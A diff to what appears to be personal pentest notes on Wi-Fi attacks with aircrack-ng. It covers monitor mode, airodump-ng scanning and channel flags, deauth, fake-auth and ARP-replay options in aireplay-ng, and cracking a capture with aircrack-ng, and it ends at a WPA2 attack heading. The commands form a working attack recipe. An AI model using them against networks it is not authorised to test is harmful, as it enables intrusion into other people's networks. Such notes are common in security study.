@@ -21,13 +21,16 @@ airmon-ng start wlanX
 airmon-ng start wlanX <channel number>
 
 #if you have problems you need to check or check kill
-#usually wpasuplicant or Network Manager is a problem
-#these items doing normal computer things interfere with hackermode
+
+airmon-ng check kill
+
+#usually wpasuplicant or Network Manager is listed
+#these services perform normal computer wifi operations and interfere with hackermode
 
 
 **airodump-ng**
 
-#now lets see networks
+#now lets see what networks are present
 
 airodump-ng wlanXmon
 
@@ -35,16 +38,19 @@ airodump-ng wlanXmon
 
 airodump-ng -b abg wlanXmon
 
+#If you run airodump with out additional flags it will only scan 2.4GHz
+
 #MORE FILTERING
 
-#we can do further with 
+#we can do further with channel bandwidth selection if you need it
 
 -2 or --ht20
 -3 or --ht40+ 
 -4 or --ht40-
 
-#we can also go by channel
+
 #by default airodump-ng will channel hop
+#isolating to a specific channel helps, even more when collecting traffic
 #if something happens when you are not on a channel you will not capture it
 
 airodump-ng -c X wlanXmon
@@ -96,7 +102,7 @@ REPLAY OPTIONS
 #-h <source MAC> (INT MAC)
 #-e <ESSID>
 
-
+#-0 Deauth
 #-1 Fake Auth
 #-3 ARP Replay
 
@@ -143,13 +149,14 @@ aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <ATTACK INT MAC> <INT>
 
 -Attack
 
-aireplay-ng -3 -b <BSSID> -h <ATTACK INT MAC> <INT>
+aireplay-ng -3 -a <BSSID> -h <ATTACK INT MAC> <INT>
 
 TAB3
 
 -Run Aircrack
 
 aircrack-ng <name>.cap
+
 
 **WPA2 Attack**
 
